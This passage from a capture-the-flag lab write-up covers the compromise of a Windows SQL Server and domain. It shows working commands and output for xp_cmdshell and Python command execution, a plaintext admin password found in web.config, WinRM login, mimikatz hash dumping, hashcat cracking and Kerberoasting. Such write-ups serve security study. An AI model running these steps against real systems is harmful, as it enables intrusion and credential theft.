Pinging 10.14.14.7 with 32 bytes of data:
General failure.
General failure.
General failure.
General failure.

Ping statistics for 10.14.14.7:
    Packets: Sent = 4, Received = 0, Lost = 4 (100% loss),
```

Local port enumeration shows that the WinRM port 5985 is listening for IPv6 connections:

```
 output
 ------
 
 Active Connections
 
   Proto  Local Address          Foreign Address        State

   TCP    [::]:80                [::]:0                 LISTENING
   TCP    [::]:135               [::]:0                 LISTENING
   TCP    [::]:445               [::]:0                 LISTENING
   TCP    [::]:1433              [::]:0                 LISTENING
   TCP    [::]:5985              [::]:0                 LISTENING
   TCP    [::]:41433             [::]:0                 LISTENING
   TCP    [::]:47001             [::]:0                 LISTENING
   TCP    [::]:49664             [::]:0                 LISTENING
   TCP    [::]:49665             [::]:0                 LISTENING
   TCP    [::]:49666             [::]:0                 LISTENING
   TCP    [::]:49667             [::]:0                 LISTENING
   TCP    [::]:49668             [::]:0                 LISTENING
   TCP    [::]:49669             [::]:0                 LISTENING
   TCP    [::]:49710             [::]:0                 LISTENING
   TCP    [::1]:50280            [::]:0                 LISTENING
   TCP    [::1]:50311            [::]:0                 LISTENING
```

The IPv6 address is `dead:babe::1001`:

```
PS C:\Users\snowscan> get-sqlquery -verbose -instance $i -username $user -password $pass -query "xp_cmdshell 'ipconfig /all'"
VERBOSE: 10.13.38.11,1433 : Connection Success.

output
------

Windows IP Configuration

   Host Name . . . . . . . . . . . . : COMPATIBILITY
   Primary Dns Suffix  . . . . . . . : intranet.poo
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : intranet.poo

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   Physical Address. . . . . . . . . : 00-50-56-8F-F7-4E
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:babe::1001(Preferred)
   Link-local IPv6 Address . . . . . : fe80::55b2:8257:8174:cc7%13(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.13.38.11(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : dead:babe::1
                                       10.13.38.2
   DNS Servers . . . . . . . . . . . : dead:babe::1
                                       10.13.38.2
   NetBIOS over Tcpip. . . . . . . . : Disabled
```

We can't read anything interesting with this user: 

```
PS C:\Users\snowscan> get-sqlquery -verbose -instance $i -username $user -password $pass -query "xp_cmdshell 'type c:\\inetpub\\wwwroot\\web.config'"
VERBOSE: 10.13.38.11,1433 : Connection Success.

output
------
Access is denied.
```

We'll need to look for another way in.

### Python to the rescue

MSSQL supports python, we can find the local administrator password by doing `system()` calls.

[http://www.nielsberglund.com/2017/04/20/sql-server-2017-python-executing-from-sql/](http://www.nielsberglund.com/2017/04/20/sql-server-2017-python-executing-from-sql/)

First, we need to make sure Python is enabled on the MSSQL server:

```
EXEC sp_configure  'external scripts enabled', 1
RECONFIGURE  WITH OVERRIDE  
```

![MSSQL](/assets/images/htb-writeup-poo/Screenshot_12.png)

Next, let's execute a simple script that'll do a `system()` call and run Windows commands:

![MSSQL](/assets/images/htb-writeup-poo/Screenshot_13.png)

So, the script is running as a different user than `xp_cmdshell` commands, we are now `POO_PUBLIC01`

After looking around the filesystem for a while, we find the local `Administrator` credentials:

```
EXEC sp_execute_external_script
@language =N'Python',
@script= N'import os; os.system("type c:\\inetpub\\wwwroot\\web.config")';
GO 
```

```
STDOUT message(s) from external script: 
C:\PROGRA~1\MICROS~1\MSSQL1~1.POO\MSSQL\EXTENS~1\POO_PUBLIC01\A093E4EB-BBD9-4913-A10A-337EB23B1BBD


STDOUT message(s) from external script: 
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <staticContent>
            <mimeMap
                fileExtension=".DS_Store"
                mimeType="application/octet-stream"
            />
        </staticContent>
        <!--
        <authentication mode="Forms">
            <forms name="login" loginUrl="/admin">
                <credentials passwordFormat = "Clear">
                    <user 
                        name="Administrator" 
                        password="EverybodyWantsToWorkAtP.O.O."
                    />
                </credentials>
            </forms>
        </authentication>
        -->
    </system.webServer>
</configuration>

Express Edition will continue to be enforced.
```

Local credentials

- name: Administrator
- password: EverybodyWantsToWorkAtP.O.O.

### Foothold

Remember that we previously discovered WinRM was listening on port 5985 and IPv6.

First, we need to setup our local attacker Windows 10 machine to trust the remote host and allow unencrypted connections (port 5985 is HTTP only).

```
PS C:\Windows\system32> winrm set winrm/config/client '@{AllowUnencrypted="true"}'
PS C:\Windows\system32> winrm set winrm/config/client '@{TrustedHosts="[dead:babe::1001]"}'
Client
    NetworkDelayms = 5000
    URLPrefix = wsman
    AllowUnencrypted = true
    Auth
        Basic = true
        Digest = true
        Kerberos = true
        Negotiate = true
        Certificate = true
        CredSSP = false
    DefaultPorts
        HTTP = 5985
        HTTPS = 5986
    TrustedHosts = [dead:babe::1001]
```

Then we'll log in using the credentials we found in web.config

```
PS C:\Users\snowscan> $SecPassword = ConvertTo-SecureString 'EverybodyWantsToWorkAtP.O.O.' -AsPlainText -Force
PS C:\Users\snowscan> $Credential = New-Object System.Management.Automation.PSCredential('Administrator', $SecPassword)
PS C:\Users\snowscan> enter-pssession -computername [dead:babe::1001] -credential $Credential

[[dead:babe::1001]]: PS C:\Users\Administrator> cd desktop
[[dead:babe::1001]]: PS C:\Users\Administrator\desktop> dir

    Directory: C:\Users\Administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/26/2018   5:29 PM             37 flag.txt


[[dead:babe::1001]]: PS C:\Users\Administrator\desktop> type flag.txt
POO{ff87c4fe10e2ef09...}
```

Another flag found: `POO{ff87c4fe10e2ef09...}`

### BackTrack flag

There's another flag hidden in the admin directory of the webserver inside the `iisstart.htm` page:

```
[[dead:babe::1001]]: PS C:\> get-childitem -recurse -path c:\inetpub | select-string -pattern "POO{"

inetpub\wwwroot\admin\iisstart.htm:4:Flag : POO{4882bd2ccfd4b53...}
inetpub\wwwroot\dev\304c0c90fbc6520610abbf378e2339d1\db\poo_connection.txt:6:Flag : POO{fcfb0767f5bd3cbc22f...}
inetpub\wwwroot\dev\dca66d38fd916317687e1390a420c3fc\db\poo_connection.txt:6:Flag : POO{fcfb0767f5bd3cbc22f...}

[[dead:babe::1001]]: PS C:\> type C:\inetpub\wwwroot\admin\iisstart.htm
"I can't go back to yesterday, because i was a different person then..."<br>
- Alice in Wonderland<br>
<br>
Flag : POO{4882bd2ccfd4b53...}
```

Flag: `POO{4882bd2ccfd4b53...}`

### Turning up the heat with mimikatz

Since we have local admin privs on the server we will upload mimikatz to find some passwords in memory:

```
PS C:\Users\snowscan> $session = new-pssession -computername [dead:babe::1001] -credential $Credential
PS C:\Users\snowscan> copy-item -tosession $session -path c:\users\snowscan\downloads\mimikatz.exe -destination c:\temp
PS C:\Users\snowscan> copy-item -tosession $session -path c:\users\snowscan\downloads\mimidrv.sys -destination c:\temp
PS C:\Users\snowscan> copy-item -tosession $session -path c:\users\snowscan\downloads\mimilib.dll -destination c:\temp
```

There's a glitch running mimikatz.exe from our WinRM Sessinon, it keeps scrolling the screen and we can't input anything.

So we'll just issue all commands on one line instead using `.\mimikatz.exe token::elevate lsadump::sam exit`

We can grab the local account hashes but we are already local admin so these are pretty much useless.

```
mimikatz(commandline) # lsadump::sam
Domain : COMPATIBILITY
SysKey : 6dcfa5e3811b05c0a5206da6384f406f
Local SID : S-1-5-21-158512341-328150952-995267585

SAMKey : 03229f5d2ecab8b1cc95959c14856ded

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: a6678287c3e811f1eaef2f1986da157a
    lm  - 0: 252720cc3ea62ef269fe2d0bce3dbad5
    ntlm- 0: a6678287c3e811f1eaef2f1986da157a
    ntlm- 1: 39b00baccb2ec3b25f175de4d5371709

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000003ea (1002)
User : POO_PUBLIC00
  Hash NTLM: 42cc6a0e40743e9cb29411a68a4513c0
    lm  - 0: 4a3d95f55be191afc9efe81330d1d01d
    ntlm- 0: 42cc6a0e40743e9cb29411a68a4513c0

RID  : 000003eb (1003)
User : POO_PUBLIC01
  Hash NTLM: 690c61db0425d35b3a1cc6cd9a7c6e9b
    lm  - 0: f6767667be6b0cdc2d689cc975259342
    ntlm- 0: 690c61db0425d35b3a1cc6cd9a7c6e9b

RID  : 000003ec (1004)
User : POO_PUBLIC02
  Hash NTLM: 7e234179207ba2f0aac8ef8097763689
    lm  - 0: 87d54ac6f13680f67e9acea7e2a63894
    ntlm- 0: 7e234179207ba2f0aac8ef8097763689

RID  : 000003ed (1005)
User : POO_PUBLIC03
  Hash NTLM: 9f60b98abc6b26428a7189b15ab130d0
    lm  - 0: 0ed19b8dc5fd0199795dc27130a6d7e9
    ntlm- 0: 9f60b98abc6b26428a7189b15ab130d0

RID  : 000003ee (1006)
User : POO_PUBLIC04
  Hash NTLM: 25f6a1404e10a114ec112649e7651ac0
    lm  - 0: 62509e9573a716316748f18bfe4d589f
    ntlm- 0: 25f6a1404e10a114ec112649e7651ac0

RID  : 000003ef (1007)
User : POO_PUBLIC05
  Hash NTLM: a5870e78fc723b557c714ab7f1bcadd2
    lm  - 0: 24bfa8832a752169f0aeb95b1623e0f0
    ntlm- 0: a5870e78fc723b557c714ab7f1bcadd2

RID  : 000003f0 (1008)
User : POO_PUBLIC06
  Hash NTLM: f58bc106ba870fec60e50481f768f942
    lm  - 0: 81dbc07dd0c22e23765796c2d4ec4969
    ntlm- 0: f58bc106ba870fec60e50481f768f942

RID  : 000003f1 (1009)
User : POO_PUBLIC07
  Hash NTLM: 9b9c11a445e2aea545f8938ac09b1922
    lm  - 0: 44471764257c7fa1fcccdc51fc5455ff
    ntlm- 0: 9b9c11a445e2aea545f8938ac09b1922

RID  : 000003f2 (1010)
User : POO_PUBLIC08
  Hash NTLM: 157332d85d901b3a0adfca7fbbcd6af5
    lm  - 0: d1efd49233e98fc94a1eb7ade4860415
    ntlm- 0: 157332d85d901b3a0adfca7fbbcd6af5

RID  : 000003f3 (1011)
User : POO_PUBLIC09
  Hash NTLM: c670d13961c29508381c0e121b8270c2
    lm  - 0: 23c1f1862f1ae2d1a2d5dd3cbeae0a05
    ntlm- 0: c670d13961c29508381c0e121b8270c2

RID  : 000003f4 (1012)
User : POO_PUBLIC10
  Hash NTLM: c0b62fb43b73abe7b6c31dbf881e747b
    lm  - 0: 7869a3a7ed47dee5e5321049dae24faa
    ntlm- 0: c0b62fb43b73abe7b6c31dbf881e747b

RID  : 000003f5 (1013)
User : POO_PUBLIC11
  Hash NTLM: 4f9400995fe130519c17f628d4ede212
    lm  - 0: 86a4242463bd52d2eeb6e991eae1bf7d
    ntlm- 0: 4f9400995fe130519c17f628d4ede212

RID  : 000003f6 (1014)
User : POO_PUBLIC12
  Hash NTLM: ac89c4c406747afaa04b07f39889985f
    lm  - 0: d1b082417e24f2e7c6d37e792db814c1
    ntlm- 0: ac89c4c406747afaa04b07f39889985f

RID  : 000003f7 (1015)
User : POO_PUBLIC13
  Hash NTLM: 6f593e0259a23d502368a934c090859d
    lm  - 0: e48522c99e9a2b285d847ef147a0c8e4
    ntlm- 0: 6f593e0259a23d502368a934c090859d

RID  : 000003f8 (1016)
User : POO_PUBLIC14
  Hash NTLM: d8225db19d4d17aec00bcddbc7f51b8c
    lm  - 0: 51b457e4c7987053becc8d58f3cb5627
    ntlm- 0: d8225db19d4d17aec00bcddbc7f51b8c

RID  : 000003f9 (1017)
User : POO_PUBLIC15
  Hash NTLM: 3e5794d444d5ba749132ea93cb721b7c
    lm  - 0: f7e1c288f749daf0e4aa121189e45279
    ntlm- 0: 3e5794d444d5ba749132ea93cb721b7c

RID  : 000003fa (1018)
User : POO_PUBLIC16
  Hash NTLM: bf9d2e47676eec558780341f7321362c
    lm  - 0: bdd2d7bb867c5d1de6efc5bc05eae4b2
    ntlm- 0: bf9d2e47676eec558780341f7321362c

RID  : 000003fb (1019)
User : POO_PUBLIC17
  Hash NTLM: 4696122ebd0587fa8686876167f3ca2f
    lm  - 0: 64f4aa9ab787d9fe3501aaabae82b573
    ntlm- 0: 4696122ebd0587fa8686876167f3ca2f

RID  : 000003fc (1020)
User : POO_PUBLIC18
  Hash NTLM: eb2f582902e6564fd7cbaace3988a452
    lm  - 0: a13cd634916ab840da1fc8b048d445dd
    ntlm- 0: eb2f582902e6564fd7cbaace3988a452

RID  : 000003fd (1021)
User : POO_PUBLIC19
  Hash NTLM: aa982b8ea00487831241cba3a6cd8a2d
    lm  - 0: af7af1ae285f02c19660e7ed9ed2389b
    ntlm- 0: aa982b8ea00487831241cba3a6cd8a2d

RID  : 000003fe (1022)
User : POO_PUBLIC20
  Hash NTLM: 0e20a30da1637d53042d253d99e416ed
    lm  - 0: 7b2ab4d63bc9a4c33a345bc5b9d49561
    ntlm- 0: 0e20a30da1637d53042d253d99e416ed

RID  : 000003ff (1023)
User : zc00l
  Hash NTLM: 0ab5e584021f433f9d2e222e35c95261
    lm  - 0: dccb3c3471701f949d318fdca8495be7
    ntlm- 0: 0ab5e584021f433f9d2e222e35c95261
```

The cache is much more interesting as we have two domain accounts here:

```
[[dead:babe::1001]]: PS C:\temp> .\mimikatz.exe token::elevate lsadump::cache exit

mimikatz(commandline) # lsadump::cache
Domain : COMPATIBILITY
SysKey : 6dcfa5e3811b05c0a5206da6384f406f

Local name : COMPATIBILITY ( S-1-5-21-158512341-328150952-995267585 )
Domain name : POO ( S-1-5-21-2413924783-1155145064-2969042445 )
Domain FQDN : intranet.poo

Policy subsystem is : 1.14
LSA Key(s) : 1, default {686c3d5a-8dfb-714b-4a74-6ce5e45bd0f8}
  [00] {686c3d5a-8dfb-714b-4a74-6ce5e45bd0f8} edde363d2913f57c555e9d3b2989e42d432c9fae46f8ca29572822ad3fcbc70e

* Iteration is set to default (10240)

[NL$1 - 3/22/2018 6:45:01 PM]
RID       : 00000452 (1106)
User      : POO\p00_dev
MsCacheV2 : 7afecfd48f35f666ae9f6edd53506d0c

[NL$2 - 3/22/2018 3:36:34 PM]
RID       : 00000453 (1107)
User      : POO\p00_adm
MsCacheV2 : 32c28e9a78d7c3e7d2f84cbfcabebeed

mimikatz(commandline) # exit
Bye!
```

We'll put those in a format hashcat can understand:

```
$DCC2$10240#p00_dev#7afecfd48f35f666ae9f6edd53506d0c
$DCC2$10240#p00_adm#32c28e9a78d7c3e7d2f84cbfcabebeed
```

Using hashcat, let's try all the SecLists password wordlists with a rule (it takes a while since DDC2 is a slow hash):

```
hashcat64 -a 0 -m 2100 -r rules\best64.rule mscachev2.txt passwords\*
```

Bingo! We cracked the two hashes:

 - p00_dev: Development1!
 - p00_adm: ZQ!zaq1

... but when we try p00_adm later we'll find out that it's an old password that doesn't work.

So what we'll do instead is use `invoke-kerberoast` to get the TGS ticket hashes and crack them offline:

![MSSQL](/assets/images/htb-writeup-poo/Screenshot_20.png)

```
SamAccountName       : p00_adm
DistinguishedName    : CN=p00_adm,CN=Users,DC=intranet,DC=poo
ServicePrincipalName : cyber_audit/intranet.poo:443
Hash                 : 
$krb5tgs$23$*ID#124_DISTINGUISHED NAME: 
                       CN=fakesvc,OU=Service,OU=Accounts,OU=EnterpriseObjects,DC=asdf,DC=pd,DC=fakedomain,DC=com SPN: 
                       F3514235-4C06-11D1-AB04-00D04FC2DCD2-GDCD/asdf.asdf.pd.fakedomain.com:50000 *9620431D1BC1A2DF294
                       A18B600DC2059$B10813B73B0CBBA3446682112C221A01BDE25B8FCE87B66F3967CD45FFEE9E6446C16D4D90EA0956E3
                       C9BEFDFC3C9855007C323BB99BC397063024FCB5CD34B3EFD0B1280A13F0D1200E543A6A71BEBB4AF120F20B32B7C4BE
                       BBC8660F01B973B382697E934493127294DD302B7AB10A117B22C5FBEE38B0ECF5B0525BCCE1F437B03E00A8C58243FF
                       9CA6EF986AE9D92335F5412C22D96E96592F8CB9AFA0F93966BFBC48DA58C2A2333169599301A236D36CE9B26EFA30F7
                       A6ED991C0EB139D9293930F8DC7B4BBB8675ECF273EC4D218F349A188B314B569F57570C06FF1C2B0FB06B22C37FAF46
                       78FF92B4D7FE37E14DBF3A5C383B12973B4509173D50688B431D33F5E8B97F009AA14218E787E3FBB4794BD930B38515
                       82AEBD8935B8E399CC146FD8684D5FC4291643A11D6130F1D8879CAFEB48CE06C709D3D4FBC2AE10748960CB6CD3A12D
                       C80F55996CD92237FC8C2A72593797AECA14B8DD1A3F46255C7158D23C2E673CC6217255A588AF9FA747B6535EA2937C
                       808DA782BBBF6BEDDEEC84470AF914A35E581B735A288354A4CE9DA724C34C1AA1523D2730B6ECDF93FEBCE76309B969
                       D9CDD71CA2762E932939AB56210340E95E4F8A6FE9B59F4C0FACA946FF96C0D46F00C6703A4531B768AB5DCAC09EAF52
                       6CFE58FD1DE7C2E69E04C2124CC7104E71FADAC495027A5C7F72347EBA61FE119A5C5ACE54E1EE6E10BD4204775E83AD
                       668767D59366F3D293E8747A9C7AD60345B74226FCE4FA3A65E1E04861BE3B2734361D4C5B5FA7632F44758110E4C912
                       2F5B2F6144121EA3E6EE2DAD9C3350889B0D26CCEB506A136ECEC225ED18FC294DF62BDB7D6B4A14F448A6258D3C702D
                       98371B1873B8738A4F4AAD87C5C3FCF65B7AD3B1E5AB81BF40DEBC05605130CDC82F35B6936A543746EB36C42A98893F
                       659434436DC391B8CFFB3376EF323B5ABCA66345297221CC5038C0B6905185A9F1A3CED3537BBA4F3ECE5EEE6A363EFF
                       FE9D532E6DB81DB29CCB4206E877E36B2AA5DB0DB1F0E430808C6E844277D51BF65D393123692E6381E3DB2219D782FA
                       FAF49511A4692E3CD3650DD51D987522D6F06281E3A1FE84A7D1DD9028F08D1C66581BED8EA82E6FB0D67FAB73CC3FBB
                       5FB2339A136FF7CE9D0E6E17D0FE50E84FC57D1A2B69BABEA4EA77EA2E0D036F6CE6B3BD3929E6EE50679C8CECEDA6FD
                       1C46A345D9BBCC5A9163B643C0D0A66AB2D9A936CACEA7E14B659DF2F414833F8AB03404A947A49431C0E458D136D758
                       EF79709F8BB580D85CC3B8F0D9990DE9EC193B770150A3ED3470019B7D5FFC0F9515F6AFC73C8D435166BE05D5F72506
                       2E30367B707C9D7BC4D5D66CA8F82654EB5DD55AEE2FB15EF1D4BDFF0F01ED4040C2E1BDBBA1E41560EB156EF5C94F50
                       7121CA4D0E76A1A6668F43A32933087F11273FCA0ABC89A53DCC3D69B8300AEBB30318090A6C7EBA72C91F8116EE8929
                       0CB267D5
```

```
hashcat64 -a 0 -m 13100 -r rules\best64.rule tgshash.txt Passwords\*
```

Password found: `ZQ!5t4r`

### Bloodhound

Unfortunately we can't establish an interactive session with our two users:

```
PS C:\Users\snowscan> $SecPassword = ConvertTo-SecureString 'ZQ!5t4r' -AsPlainText -Force
PS C:\Users\snowscan> $Credential = New-Object System.Management.Automation.PSCredential('p00_adm', $SecPassword)
PS C:\Users\snowscan> enter-pssession -computername [dead:babe::1001] -credential $Credential
enter-pssession : Connecting to remote server [dead:babe::1001] failed with the following error message : Access is denied. For more information, see the
about_Remote_Troubleshooting Help topic.
At line:1 char:1
+ enter-pssession -computername [dead:babe::1001] -credential $Credenti ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidArgument: ([dead:babe::1001]:String) [Enter-PSSession], PSRemotingTransportException
    + FullyQualifiedErrorId : CreateRemoteRunspaceFailed

PS C:\Users\snowscan> $SecPassword = ConvertTo-SecureString 'Development1!' -AsPlainText -Force
PS C:\Users\snowscan> $Credential = New-Object System.Management.Automation.PSCredential('p00_dev', $SecPassword)
PS C:\Users\snowscan> enter-pssession -computername [dead:babe::1001] -credential $Credential
enter-pssession : Connecting to remote server [dead:babe::1001] failed with the following error message : Access is denied. For more information, see the
about_Remote_Troubleshooting Help topic.
At line:1 char:1
+ enter-pssession -computername [dead:babe::1001] -credential $Credenti ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidArgument: ([dead:babe::1001]:String) [Enter-PSSession], PSRemotingTransportException
    + FullyQualifiedErrorId : CreateRemoteRunspaceFailed
```

Using MSSQL with xp_cmdshell, we can use Powerview to poke around the DC:

```
logoncount             : 13
badpasswordtime        : 4/11/2018 11:16:31 PM
description            : Built-in account for administering the computer/domain
distinguishedname      : CN=Administrator,CN=Users,DC=intranet,DC=poo
objectclass            : {top, person, organizationalPerson, user}
name                   : Administrator
objectsid              : S-1-5-21-2413924783-1155145064-2969042445-500
samaccountname         : Administrator
logonhours             : {255, 255, 255, 255...}
admincount             : 1
codepage               : 0
samaccounttype         : USER_OBJECT
accountexpires         : 1/1/1601 2:00:00 AM
countrycode            : 0
whenchanged            : 4/11/2018 9:45:33 PM
instancetype           : 4
objectguid             : 28181e2a-574b-4c3f-a3bb-8953283b3a9c
lastlogon              : 3/15/2018 12:31:41 AM
lastlogoff             : 1/1/1601 2:00:00 AM
objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=intranet,DC=poo
dscorepropagationdata  : {3/22/2018 4:08:40 PM, 3/21/2018 7:17:00 PM, 3/16/2018 10:35:01 AM, 3/16/2018 10:35:01 AM...}
memberof               : {CN=Group Policy Creator Owners,CN=Users,DC=intranet,DC=poo, CN=Domain 
                         Admins,CN=Users,DC=intranet,DC=poo, CN=Enterprise Admins,CN=Users,DC=intranet,DC=poo, 
                         CN=Schema Admins,CN=Users,DC=intranet,DC=poo...}
whencreated            : 3/16/2018 10:19:14 AM
iscriticalsystemobject : True
badpwdcount            : 28
cn                     : Administrator
useraccountcontrol     : ACCOUNTDISABLE, NORMAL_ACCOUNT
usncreated             : 8196
primarygroupid         : 513
pwdlastset             : 4/12/2018 12:45:33 AM
usnchanged             : 69874
NULL
pwdlastset             : 1/1/1601 2:00:00 AM
logoncount             : 0
badpasswordtime        : 1/1/1601 2:00:00 AM
description            : Built-in account for guest access to the computer/domain
distinguishedname      : CN=Guest,CN=Users,DC=intranet,DC=poo
objectclass            : {top, person, organizationalPerson, user}
name                   : Guest
objectsid              : S-1-5-21-2413924783-1155145064-2969042445-501
samaccountname         : Guest
codepage               : 0
samaccounttype         : USER_OBJECT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 3/16/2018 10:19:14 AM
instancetype           : 4
objectguid             : 89b1713e-77d0-4636-88f3-3f966396a869
lastlogon              : 1/1/1601 2:00:00 AM
lastlogoff             : 1/1/1601 2:00:00 AM
objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=intranet,DC=poo
dscorepropagationdata  : {3/16/2018 10:19:52 AM, 1/1/1601 12:00:01 AM}
memberof               : CN=Guests,CN=Builtin,DC=intranet,DC=poo
whencreated            : 3/16/2018 10:19:14 AM
badpwdcount            : 0
cn                     : Guest
useraccountcontrol     : ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usncreated             : 8197
primarygroupid         : 514
iscriticalsystemobject : True
usnchanged             : 8197
NULL
pwdlastset             : 1/1/1601 2:00:00 AM
logoncount             : 0
badpasswordtime        : 1/1/1601 2:00:00 AM
description            : A user account managed by the system.
distinguishedname      : CN=DefaultAccount,CN=Users,DC=intranet,DC=poo
objectclass            : {top, person, organizationalPerson, user}
name                   : DefaultAccount
objectsid              : S-1-5-21-2413924783-1155145064-2969042445-503
samaccountname         : DefaultAccount
codepage               : 0
samaccounttype         : USER_OBJECT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 3/16/2018 10:19:14 AM
instancetype           : 4
objectguid             : ba3ccc6b-962c-47d8-a8c3-3dcb17a0a22c
lastlogon              : 1/1/1601 2:00:00 AM
lastlogoff             : 1/1/1601 2:00:00 AM
objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=intranet,DC=poo
dscorepropagationdata  : {3/16/2018 10:19:52 AM, 1/1/1601 12:00:01 AM}
memberof               : CN=System Managed Accounts Group,CN=Builtin,DC=intranet,DC=poo
whencreated            : 3/16/2018 10:19:14 AM
badpwdcount            : 0
cn                     : DefaultAccount
useraccountcontrol     : ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usncreated             : 8198
primarygroupid         : 513
iscriticalsystemobject : True
usnchanged             : 8198
NULL
logoncount            : 68
badpasswordtime       : 3/26/2018 12:45:09 PM
description           : P.O.O. Domain Administrator
distinguishedname     : CN=mr3ks,CN=Users,DC=intranet,DC=poo
objectclass           : {top, person, organizationalPerson, user}
displayname           : mr3ks
lastlogontimestamp    : 3/30/2018 12:16:01 AM
name                  : mr3ks
objectsid             : S-1-5-21-2413924783-1155145064-2969042445-1000
samaccountname        : mr3ks
logonhours            : {255, 255, 255, 255...}
admincount            : 1
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : 1/1/1601 2:00:00 AM
countrycode           : 0
whenchanged           : 3/29/2018 9:16:01 PM
instancetype          : 4
objectguid            : 319c782b-5a67-445a-9118-4b5c9ec2bd59
lastlogon             : 4/7/2018 1:50:00 PM
lastlogoff            : 1/1/1601 2:00:00 AM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=intranet,DC=poo
dscorepropagationdata : {3/22/2018 3:58:57 PM, 3/22/2018 1:08:40 PM, 3/22/2018 12:32:59 PM, 3/21/2018 7:17:00 PM...}
whencreated           : 3/16/2018 10:19:14 AM
badpwdcount           : 0
cn                    : mr3ks
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usncreated            : 8199
primarygroupid        : 512
pwdlastset            : 3/22/2018 6:28:15 PM
usnchanged            : 57372
NULL
logoncount                    : 0
badpasswordtime               : 1/1/1601 2:00:00 AM
description                   : Key Distribution Center Service Account
distinguishedname             : CN=krbtgt,CN=Users,DC=intranet,DC=poo
objectclass                   : {top, person, organizationalPerson, user}
name                          : krbtgt
primarygroupid                : 513
objectsid                     : S-1-5-21-2413924783-1155145064-2969042445-502
samaccountname                : krbtgt
admincount                    : 1
codepage                      : 0
samaccounttype                : USER_OBJECT
showinadvancedviewonly        : True
accountexpires                : NEVER
cn                            : krbtgt
whenchanged                   : 3/22/2018 4:08:40 PM
instancetype                  : 4
objectguid                    : f726675e-d7e8-43bd-9c19-ce0e14b91038
lastlogon                     : 1/1/1601 2:00:00 AM
lastlogoff                    : 1/1/1601 2:00:00 AM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=intranet,DC=poo
dscorepropagationdata         : {3/22/2018 4:08:40 PM, 3/21/2018 7:17:00 PM, 3/16/2018 10:35:01 AM, 3/16/2018 10:19:52 
                                AM...}
serviceprincipalname          : kadmin/changepw
memberof                      : CN=Denied RODC Password Replication Group,CN=Users,DC=intranet,DC=poo
whencreated                   : 3/16/2018 10:19:51 AM
iscriticalsystemobject        : True
badpwdcount                   : 0
useraccountcontrol            : ACCOUNTDISABLE, NORMAL_ACCOUNT
usncreated                    : 12324
countrycode                   : 0
pwdlastset                    : 3/16/2018 12:19:51 PM
msds-supportedencryptiontypes : 0
usnchanged                    : 32891
NULL
logoncount            : 0
badpasswordtime       : 1/1/1601 2:00:00 AM
distinguishedname     : CN=p00_hr,CN=Users,DC=intranet,DC=poo
objectclass           : {top, person, organizationalPerson, user}
name                  : p00_hr
objectsid             : S-1-5-21-2413924783-1155145064-2969042445-1105
samaccountname        : p00_hr
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : 1/1/1601 2:00:00 AM
countrycode           : 0
whenchanged           : 3/21/2018 7:09:38 PM
instancetype          : 4
objectguid            : 7d359419-cb48-4d54-b1fd-f2eabf8ae94d
lastlogon             : 1/1/1601 2:00:00 AM
lastlogoff            : 1/1/1601 2:00:00 AM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=intranet,DC=poo
dscorepropagationdata : 1/1/1601 12:00:00 AM
serviceprincipalname  : HR_peoplesoft/intranet.poo:1433
whencreated           : 3/21/2018 7:06:32 PM
badpwdcount           : 0
cn                    : p00_hr
useraccountcontrol    : NORMAL_ACCOUNT
usncreated            : 25712
primarygroupid        : 513
pwdlastset            : 3/21/2018 9:06:32 PM
usnchanged            : 25727
NULL
logoncount            : 19
badpasswordtime       : 4/11/2018 10:58:02 PM
distinguishedname     : CN=p00_dev,CN=Users,DC=intranet,DC=poo
objectclass           : {top, person, organizationalPerson, user}
lastlogontimestamp    : 3/21/2018 9:15:25 PM
name                  : p00_dev
objectsid             : S-1-5-21-2413924783-1155145064-2969042445-1106
samaccountname        : p00_dev
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : 1/1/1601 2:00:00 AM
countrycode           : 0
whenchanged           : 3/21/2018 7:15:25 PM
instancetype          : 4
usncreated            : 25717
objectguid            : f221260f-558d-4787-b867-ec03a01cfa2e
lastlogoff            : 1/1/1601 2:00:00 AM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=intranet,DC=poo
dscorepropagationdata : 1/1/1601 12:00:00 AM
lastlogon             : 3/22/2018 7:51:35 PM
badpwdcount           : 3
cn                    : p00_dev
useraccountcontrol    : NORMAL_ACCOUNT
whencreated           : 3/21/2018 7:06:49 PM
primarygroupid        : 513
pwdlastset            : 3/21/2018 9:06:49 PM
usnchanged            : 25736
NULL
logoncount            : 13
badpasswordtime       : 3/22/2018 1:53:22 PM
distinguishedname     : CN=p00_adm,CN=Users,DC=intranet,DC=poo
objectclass           : {top, person, organizationalPerson, user}
